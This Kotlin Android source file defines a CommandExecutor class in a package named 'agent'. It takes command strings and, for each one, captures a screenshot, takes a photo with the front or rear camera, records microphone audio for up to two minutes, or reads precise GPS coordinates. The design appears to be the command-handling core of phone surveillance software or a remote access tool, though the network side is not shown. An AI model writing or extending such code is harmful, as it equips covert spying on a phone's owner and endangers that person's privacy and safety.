package org.hullas.agent

import android.content.Context
import android.location.Location
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class CommandExecutor(private val ctx: Context) {
    private val tag = "CommandExecutor"

    suspend fun execute(cmd: Command): Result<File?> {
        return try {
            when (cmd.cmd) {
                "screenshot" -> Result.success(ProjectionHelper.captureScreenshot(ctx))
                "cam_back", "photo" -> Result.success(takePhoto(CameraSelector.LENS_FACING_BACK))
                "cam_front" -> Result.success(takePhoto(CameraSelector.LENS_FACING_FRONT))
                "record" -> {
                    val dur = cmd.args.optInt("duration", 10).coerceIn(5, 120)
                    Result.success(recordAudio(dur))
                }
                "location" -> Result.failure(LocationException(getLocation()))
                else -> Result.failure(Exception("Noma'lum buyruq: ${cmd.cmd}"))
            }
        } catch (e: Exception) {
            Log.e(tag, "Execute: ${cmd.cmd}", e)
            Result.failure(e)
        }
    }

    private suspend fun takePhoto(lens: Int): File? {
        val owner: LifecycleOwner = AppLifecycle.cameraLifecycle()
        return suspendCoroutine { cont ->
            val file = File(ctx.cacheDir, "photo_${System.currentTimeMillis()}.jpg")
            ProcessCameraProvider.getInstance(ctx).also { future ->
                future.addListener({
                    try {
                        val provider = future.get()
                        val capture = ImageCapture.Builder().build()
                        val selector = CameraSelector.Builder()
                            .requireLensFacing(lens).build()
                        provider.unbindAll()
                        provider.bindToLifecycle(owner, selector, capture)
                        capture.takePicture(
                            ImageCapture.OutputFileOptions.Builder(file).build(),
                            ContextCompat.getMainExecutor(ctx),
                            object : ImageCapture.OnImageSavedCallback {
                                override fun onImageSaved(
                                    output: ImageCapture.OutputFileResults,
                                ) {
                                    provider.unbindAll()
                                    cont.resume(file)
                                }
                                override fun onError(exc: ImageCaptureException) {
                                    provider.unbindAll()
                                    cont.resume(null)
                                }
                            },
                        )
                    } catch (e: Exception) {
                        cont.resume(null)
                    }
                }, ContextCompat.getMainExecutor(ctx))
            }
        }
    }

    private fun recordAudio(seconds: Int): File? {
        val file = File(ctx.cacheDir, "audio_${System.currentTimeMillis()}.m4a")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(ctx)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            Thread.sleep(seconds * 1000L)
            recorder.stop()
            return if (file.length() > 0) file else null
        } catch (e: Exception) {
            Log.e(tag, "Audio", e)
            return null
        } finally {
            try { recorder.release() } catch (_: Exception) {}
        }
    }

    private fun getLocation(): Pair<Double, Double>? {
        val client = LocationServices.getFusedLocationProviderClient(ctx)
        val latch = CountDownLatch(1)
        var loc: Location? = null
        val cts = CancellationTokenSource()
        client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, cts.token)
            .addOnSuccessListener { location ->
                loc = location
                latch.countDown()
            }
            .addOnFailureListener {
                client.lastLocation
                    .addOnSuccessListener { last -> loc = last; latch.countDown() }
                    .addOnFailureListener { latch.countDown() }
            }
        latch.await(15, TimeUnit.SECONDS)
        val l = loc ?: return null
        return Pair(l.latitude, l.longitude)
    }
}

class LocationException(val coords: Pair<Double, Double>?) : Exception(
    if (coords != null) "location_ok" else "Lokatsiya olinmadi",
)